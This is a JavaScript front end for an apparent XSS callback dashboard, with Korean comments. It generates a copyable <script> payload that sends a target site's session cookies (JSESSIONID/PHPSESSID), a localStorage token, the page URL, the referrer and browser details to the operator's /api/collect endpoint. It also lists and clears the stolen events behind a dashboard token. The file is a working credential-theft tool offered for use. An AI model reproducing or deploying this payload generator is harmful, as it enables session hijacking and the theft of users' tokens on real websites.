"use strict";

const $ = (selector) => document.querySelector(selector);

const escapeHtml = (value = "") => {
  return String(value).replace(
    /[&<>"']/g,
    (character) =>
      ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "'",
      })[character],
  );
};

const campaignInput = $("#campaign");
const typeInput = $("#type");
const baseUrlInput = $("#baseUrl");
const payloadOutput = $("#payload");
const copyButton = $("#copy");
const tokenInput = $("#token");
const loadButton = $("#load");
const clearButton = $("#clear");
const eventCount = $("#count");
const lastCallback = $("#last");
const campaignCount = $("#campaignCount");
const eventRows = $("#eventRows");

baseUrlInput.value = window.location.origin;

function sanitizeCampaignId(value) {
  return String(value)
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/\r?\n/g, "");
}

function renderPayload() {
  const baseUrl = baseUrlInput.value.trim().replace(/\/+$/, "");
  const campaign = sanitizeCampaignId(campaignInput.value.trim());
  const eventType = sanitizeCampaignId(typeInput.value);

  // 💡 [핵심 수정] 타겟 사이트에서 실행될 때 작동할 동적 자바스크립트 명령어를 문자열 형태로 조립합니다.
  const payload =
    `<script>` +
    `fetch('${baseUrl}/api/collect',{` +
    `method:'POST',` +
    `body:JSON.stringify({` +
    `campaign:'${campaign}',` +
    `type:'${eventType}',` +
    `page:location.href,` +
    // 💡 [핵심] JSESSIONID 또는 PHPSESSID만 매칭해서 가져오고, 없으면 기존 쿠키 일부를 반환합니다.
    `sessionId: (() => {` +
    `  const match = document.cookie.match(/(?:JSESSIONID|PHPSESSID)=([^;]+)/);` +
    `  return match ? match[1] : (document.cookie || 'no-cookie').substring(0, 190);` +
    `})(),` + 
    `userToken: localStorage.getItem('last_Tabid') || 'no-token-found',` +
    `referrer:document.referrer,` +
    `documentTitle:document.title,` +
    `cookieEnabled:navigator.cookieEnabled,` +
    `sessionCookiePresent:document.cookie.length>0,` +
    `screenWidth:screen.width,` +
    `screenHeight:screen.height,` +
    `language:navigator.language,` +
    `platform:navigator.platform` +
    `})` +
    `})` +
    `.catch(()=>{});` +
    `<\/script>`;

  payloadOutput.textContent = payload;
}

campaignInput.addEventListener("input", renderPayload);
typeInput.addEventListener("change", renderPayload);
baseUrlInput.addEventListener("input", renderPayload);
renderPayload();

copyButton.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(payloadOutput.textContent);
    copyButton.textContent = "COPIED";
    window.setTimeout(() => {
      copyButton.textContent = "COPY CALLBACK";
    }, 1000);
  } catch (error) {
    console.error("Clipboard copy failed:", error);
    alert("클립보드 복사에 실패했습니다.");
  }
});

function setLoadingState(isLoading) {
  loadButton.disabled = isLoading;
  loadButton.textContent = isLoading ? "LOADING..." : "LOAD";
}

function renderEvents(events) {
  eventCount.textContent = String(events.length);
  lastCallback.textContent = events[0]?.receivedAt
    ? new Date(events[0].receivedAt).toLocaleString("ko-KR")
    : "-";

  const campaigns = new Set(
    events.map((event) => event.campaign).filter(Boolean),
  );
  campaignCount.textContent = String(campaigns.size);

  if (events.length === 0) {
    eventRows.innerHTML = `
      <tr>
        <td colspan="8" class="muted empty-row">
          No events
        </td>
      </tr>
    `;
    return;
  }

  eventRows.innerHTML = events
    .map((event) => {
      const receivedAt = event.receivedAt
        ? new Date(event.receivedAt).toLocaleString("ko-KR")
        : "-";
      return `
        <tr>
          <td>${escapeHtml(receivedAt)}</td>
          <td>${escapeHtml(event.campaign || "-")}</td>
          <td>${escapeHtml(event.type || "-")}</td>
          <td class="page" title="${escapeHtml(event.sessionId || "")}">${escapeHtml(event.sessionId || "-")}</td>
          <td class="page" title="${escapeHtml(event.userToken || "")}">${escapeHtml(event.userToken || "-")}</td>
          <td class="page" title="${escapeHtml(event.page || "")}">${escapeHtml(event.page || "-")}</td>
          <td class="page" title="${escapeHtml(event.referrer || "")}">${escapeHtml(event.referrer || "-")}</td>
          <td class="page" title="${escapeHtml(event.userAgent || "")}">${escapeHtml(event.userAgent || "-")}</td>
        </tr>
      `;
    })
    .join("");
}

async function loadEvents() {
  const token = tokenInput.value.trim();
  if (!token) {
    alert("Dashboard token을 입력하세요.");
    tokenInput.focus();
    return;
  }
  setLoadingState(true);
  try {
    const response = await fetch("/api/events", {
      method: "GET",
      headers: { "x-dashboard-token": token },
    });
    const data = await response.json().catch(() => ({}));
    if (!response.ok) {
      throw new Error(data.error || "이벤트 조회에 실패했습니다.");
    }
    const events = Array.isArray(data.events) ? data.events : [];
    renderEvents(events);
  } catch (error) {
    console.error("Event loading failed:", error);
    alert(error.message || "이벤트 조회에 실패했습니다.");
  } finally {
    setLoadingState(false);
  }
}

loadButton.addEventListener("click", loadEvents);
tokenInput.addEventListener("keydown", (event) => {
  if (event.key === "Enter") {
    loadEvents();
  }
});

clearButton.addEventListener("click", async () => {
  const token = tokenInput.value.trim();
  if (!token) {
    alert("Dashboard token을 입력하세요.");
    tokenInput.focus();
    return;
  }
  const confirmed = window.confirm("저장된 모든 이벤트를 삭제하시겠습니까?");
  if (!confirmed) {
    return;
  }
  clearButton.disabled = true;
  clearButton.textContent = "CLEARING...";
  try {
    const response = await fetch("/api/clear", {
      method: "DELETE",
      headers: { "x-dashboard-token": token },
    });
    const data = await response.json().catch(() => ({}));
    if (!response.ok) {
      throw new Error(data.error || "이벤트 삭제에 실패했습니다.");
    }
    await loadEvents();
  } catch (error) {
    console.error("Event clearing failed:", error);
    alert(error.message || "이벤트 삭제에 실패했습니다.");
  } finally {
    clearButton.disabled = false;
    clearButton.textContent = "CLEAR";
  }
});

const navigationLinks = Array.from(document.querySelectorAll(".nav a"));

function activateNavigationLink(targetId) {
  navigationLinks.forEach((link) => {
    const isActive = link.getAttribute("href") === `#${targetId}`;
    link.classList.toggle("active", isActive);
    if (isActive) {
      link.setAttribute("aria-current", "page");
    } else {
      link.removeAttribute("aria-current");
    }
  });
}

navigationLinks.forEach((link) => {
  link.addEventListener("click", (event) => {
    event.preventDefault();
    const targetSelector = link.getAttribute("href");
    if (!targetSelector || !targetSelector.startsWith("#")) {
      return;
    }
    const target = document.querySelector(targetSelector);
    if (!target) {
      console.error(`Navigation target not found: ${targetSelector}`);
      return;
    }
    activateNavigationLink(targetSelector.substring(1));
    target.scrollIntoView({ behavior: "smooth", block: "start" });
    window.history.replaceState(null, "", targetSelector);
  });
});

const sections = Array.from(document.querySelectorAll(".page-section"));
const sectionObserver = new IntersectionObserver(
  (entries) => {
    const visibleEntries = entries
      .filter((entry) => entry.isIntersecting)
      .sort(
        (first, second) => second.intersectionRatio - first.intersectionRatio,
      );
    if (visibleEntries.length === 0) {
      return;
    }
    activateNavigationLink(visibleEntries[0].target.id);
  },
  { root: null, rootMargin: "-20% 0px -60% 0px", threshold: [0.1, 0.25, 0.5] },
);

sections.forEach((section) => {
  sectionObserver.observe(section);
});

window.addEventListener("load", () => {
  const hash = window.location.hash;
  if (!hash) {
    return;
  }
  const target = document.querySelector(hash);
  if (!target) {
    return;
  }
  window.setTimeout(() => {
    activateNavigationLink(target.id);
    target.scrollIntoView({ behavior: "auto", block: "start" });
  }, 0);
});